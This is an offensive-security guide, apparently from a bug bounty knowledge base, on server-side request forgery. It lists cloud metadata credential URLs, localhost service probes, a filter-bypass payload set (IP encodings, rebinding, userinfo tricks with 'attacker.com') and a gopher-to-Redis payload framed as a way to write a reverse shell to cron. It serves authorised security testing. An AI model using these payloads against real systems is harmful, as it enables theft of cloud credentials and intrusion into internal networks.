# SSRF (Server-Side Request Forgery)

SSRF is the server making a request on your behalf to a destination you control. Its value is not the request; it is what the server can reach that you cannot: cloud metadata, internal services, loopback admin panels, and the internal network. The best SSRFs end in cloud credentials and full account compromise.

## The mental model

Find any feature where the server fetches a URL, then take control of where it fetches. The feature can be obvious (a webhook, an "import from URL," a PDF/screenshot generator, an avatar-by-URL, a link preview) or hidden (an XML parser resolving entities, a document converter following references, a media processor fetching remote assets, an SSO fetching metadata, a `jku` in a JWT). Once you control the destination, the prize is internal reachability.

## Where it hides / tell-tales

- **Any URL input**: webhooks, callbacks, `redirect_uri`-like fields, RSS/feed importers, image/file "from URL," PDF and thumbnail generators, link unfurlers, XML/SVG parsers, `<img>` in server-rendered HTML, document converters, proxy/fetch endpoints.
- **Protocols other than http**: `file://` (read local files), `gopher://` (craft arbitrary TCP, including HTTP, Redis, SMTP payloads), `dict://`, `ftp://`, `ldap://`. A fetcher that accepts these is far more dangerous.
- **Partial/blind SSRF signals**: no response body, but you observe timing differences, DNS lookups to your server (use a DNS logger), or different errors for open vs closed internal ports. Blind SSRF to the metadata service still steals credentials because the server reads them even if you do not see the body, as long as you can exfiltrate (SSRF into a store, a webhook that logs, a second request).
- **The fetch happens server-side in a context with cloud identity**: EC2/ECS/EKS task roles, GCP/Azure instance identity. That is the money, see `../cloud-and-infra/Cloud-Metadata-and-SSRF-to-Cloud.md`.

## Real material

The canonical cloud-metadata targets (reachability is the whole bug):

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/     (AWS IMDSv1)
http://169.254.169.254/latest/api/token                               (IMDSv2, needs PUT + header)
http://metadata.google.internal/computeMetadata/v1/   (GCP, needs Metadata-Flavor: Google)
http://169.254.169.254/metadata/instance?api-version=2021-02-01       (Azure, needs Metadata:true)
http://100.100.200.200/latest/meta-data/                              (Alibaba)
```

Localhost and internal service reachability tests:

```
http://127.0.0.1:80/  http://localhost/admin  http://127.0.0.1:6379/  (Redis)
http://127.0.0.1:9200/ (Elasticsearch)  http://127.0.0.1:8500/ (Consul)
http://[::1]:80/  http://0.0.0.0:80/
```

Filter and allowlist bypass set (when a naive check blocks `127.0.0.1` or `169.254.169.254`):

```
http://127.1/                     (short form)
http://0x7f000001/                (hex)
http://2130706433/                (decimal)
http://0177.0.0.1/                (octal)
http://127.0.0.1.nip.io/          (DNS that resolves to 127.0.0.1)
http://localtest.me/              (resolves to 127.0.0.1)
http://[0:0:0:0:0:ffff:127.0.0.1] (IPv6-mapped)
http://169.254.169.254%2561/      (double URL-encode)
http://attacker.com@169.254.169.254/   (userinfo confusion)
http://169.254.169.254#@target/   (fragment trick)
http://spoofed.target.com/        (DNS rebinding: resolves public first, then 169.254.169.254)
```

Gopher to talk to Redis (write a reverse shell to cron, or poison a key). The payload is CRLF-delimited Redis protocol smuggled as a URL:

```
gopher://127.0.0.1:6379/_%0D%0ASET%20key%20value%0D%0A...
```

## Beyond the basics

- **DNS rebinding beats allowlist-then-connect gaps**: the server resolves your hostname, checks it is public (passes), then connects, re-resolving to `169.254.169.254` or an internal IP. Exploit when there is a time gap between validation and fetch, or when the resolver and the connector resolve separately. Use a rebinding service with a very low TTL.
- **Redirect-based bypass**: the server validates your URL (public, allowed), fetches it, you return a `302` to `http://169.254.169.254/...`, and the fetcher follows the redirect without re-validating. Always test whether redirects are followed and re-checked.
- **IMDSv2 is not a wall**: it requires a `PUT` to get a token then a header on the request. A full-featured SSRF (webhook that lets you set method and headers, or gopher) can perform the `PUT`. Many "SSRF only does GET" writeups stop too early; check if you can control method and headers.
- **Protocol smuggling via gopher**: turns a read-only SSRF into arbitrary single-packet TCP: unauthenticated Redis, memcached, internal HTTP APIs, SMTP for internal phishing, FastCGI for RCE. This is the escalation path from "I reached localhost" to "I ran code."
- **Blind-to-impact**: even with no response, chain SSRF into a sink you can read. Point it at an internal service that stores or reflects, exfiltrate via a second channel, or use error-based and timing-based oracles to read one byte at a time.
- **Parser-level SSRF**: XXE (see `XXE.md`), SVG with external references, PDF generators that fetch `<img src>`, Office/LibreOffice document conversion, and headless-browser screenshotters that render attacker HTML with `fetch()` to internal hosts. The screenshot/PDF feature is one of the richest SSRF sources because it runs a full browser.
- **Internal service fingerprinting**: use response timing and distinctive error pages to map the internal network, then target known internal admin panels (Jenkins, Kubernetes API, Consul, etcd, Spring `/actuator`).

## What to watch for

- A reachable `169.254.169.254` is not automatically credentials; confirm the identity endpoint returns a role and keys, and that the keys are usable, before claiming critical.
- Egress firewalls and metadata hop-limit/IMDSv2 defenses may block the obvious path; pivot to redirect and gopher and header-control techniques before concluding it is dead.
- Do not pivot deep into internal infrastructure or exfiltrate real credentials beyond proof on a live program; demonstrate reachability and stop.

## Hunting checklist

- Inventory every feature that fetches a URL, including hidden parsers (XML, SVG, PDF, screenshot).
- Point each at your logging host (HTTP and DNS) to confirm server-side fetch and whether it is blind.
- Test cloud metadata endpoints and localhost/internal ports.
- Run the allowlist-bypass set: alternate IP encodings, rebinding hosts, userinfo, redirects.
- Test non-http protocols (`file`, `gopher`, `dict`) and whether you can control method and headers (for IMDSv2 and gopher).
- Chain blind SSRF into a readable sink; escalate reachable internal services with gopher.
